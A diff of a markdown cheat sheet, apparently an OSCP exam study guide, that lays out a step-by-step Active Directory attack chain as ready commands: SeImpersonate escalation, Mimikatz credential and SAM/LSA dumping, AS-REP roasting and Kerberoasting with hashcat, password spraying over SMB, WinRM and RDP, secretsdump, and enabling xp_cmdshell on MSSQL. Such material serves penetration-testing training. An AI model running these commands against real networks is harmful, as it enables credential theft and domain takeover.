@@ -1,117 +1,76 @@
-# 🛡️ OSCP Active Directory Lab Guide (Refined)
+# 🛡️ OSCP Active Directory Lab Guide
 
 ## 1. Escalate on MS01 (Always Dual-Homed)
-- Confirm **SeImpersonatePrivilege** (e.g. `whoami /priv`)
-- Use **PrintSpoofer** to escalate to Local Admin  
-  ```bash
-  PrintSpoofer.exe -i -c cmd
-Dump credentials with Mimikatz
-
-powershell
-Copy
-Edit
-sekurlsa::logonpasswords
-2. Enumerate the Domain (From MS01)
-Use nxc to:
-
-Enumerate domain users and build domain_users.txt
-
-bash
-Copy
-Edit
-nxc smb --users --host <DC>
-Enumerate SMB shares
-
-bash
-Copy
-Edit
-nxc smb --shares --host <target>
-Check for Kerberoasting:
-
-bash
-Copy
-Edit
-GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request
-Check for AS-REP Roasting:
-
-bash
-Copy
-Edit
-GetNPUsers.py <domain>/ -usersfile domain_users.txt -no-pass -dc-ip <DC_IP>
-Password spray via:
-
-bash
-Copy
-Edit
-nxc smb --spray ...
-nxc winrm --spray ...
-nxc rdp --spray ...
-3. Pivot to MS02
-Use sprayed creds to access via WinRM or RDP:
-
-bash
-Copy
-Edit
-nxc winrm --auth <user>:<pass> --host <MS02>
-or
-
-bash
-Copy
-Edit
-xfreerdp /u:<user> /p:<pass> /v:<MS02>
-4. Enumerate MS02
-Look for:
-
-C:\windows.old folder (old user data, SAM, SYSTEM)
-
-Custom binaries → strings to extract creds
-
-PowerShell history:
-
-powershell
-Copy
-Edit
+- Check privileges:
+```powershell
+whoami /priv
+```
+- If `SeImpersonatePrivilege` is there, use one of [these](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege) to escalate to Local Admin
+## 2. Pillaging
+- Dump credentials with Mimikatz:
+```powershell
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+```
+- Check PowerShell history:
+```powershell
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-Dump SAM and SYSTEM files locally:
+```
+## 3. Enumerate the Domain (From MS01)
+- Enumerate domain users and build a wordlist
+```bash
+$ nxc smb 192.168.X.X -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" {print $5}' > domain_users
+```
+- Enumerate SMB shares
+```bash
+nxc smb 192.168.X.X -u <user> -p <pass> --shares
+```
+- Check for [AS-REP Roasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/asreproasting):
+```bash
+impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users
+hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou -r /usr/share/hashcast/rules/best64.rule --force
+```
+- Check for [Kerberoasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting):
+```bash
+impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>
+hashcat -m 13100 kerberoast_users /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+- Password spray the domain to enumerate valid accounts and remote access:
+```bash
+nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +
+nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +
+nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
+```
+## 3. Pivot to MS02
+- Use sprayed creds to access via WinRM or RDP:
+```bash
+evil-winrm -u <user> -p <pass> -i <MS02>
+xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
+```
+## 4. Enumerate MS02
+- Check for `C:\windows.old` folder → [dump SAM and SYSTEM locally](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/local-sam-dump):
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+- Look for custom binaries → download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
+- Read [PowerShell history](https://x7331.gitbook.io/boxes/tl-dr/infra/windows#files):
+```powershell
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
-bash
-Copy
-Edit
-secretsdump.py -sam SAM -system SYSTEM LOCAL
-5. Domain Privilege Escalation
-Crack Kerberoast/AS-REP hashes (e.g. with hashcat or john)
-
-Use cracked SQL creds to connect with mssqlclient.py:
-
-bash
-Copy
-Edit
+# Enumerate the path
+(Get-PSReadlineOption).HistorySavePath
+# List its contents
+cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+## 5. Domain Privilege Escalation
+- Crack Kerberoast/AS-REP hashes (e.g. with hashcat or john)
+- Use cracked SQL creds to connect with mssqlclient.py:
+```bash
 mssqlclient.py <domain>/<user>@<host> -windows-auth
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
-Spray all discovered creds again to escalate further
-
-Once Domain Admin, dump all relevant data and finalize report
-
-Quick Visual Flow
-csharp
-Copy
-Edit
-[MS01: Low Priv User]
-        ↓
-[Privilege Escalation: SeImpersonate → LA]
-        ↓
-[Mimikatz → Dump Creds]
-        ↓
-[Domain Enum: nxc, GetNPUsers, GetUserSPNs]
-        ↓
-[Password Spray: SMB / WinRM / RDP]
-        ↓
-[Access MS02 (WinRM/RDP)]
-        ↓
-[Enum MS02: windows.old, PS history, strings]
-        ↓
-[Dump SAM+SYSTEM → secretsdump]
-        ↓
-[Crack / Reuse → Get DA]
+```
+- Spray all discovered creds again to escalate further
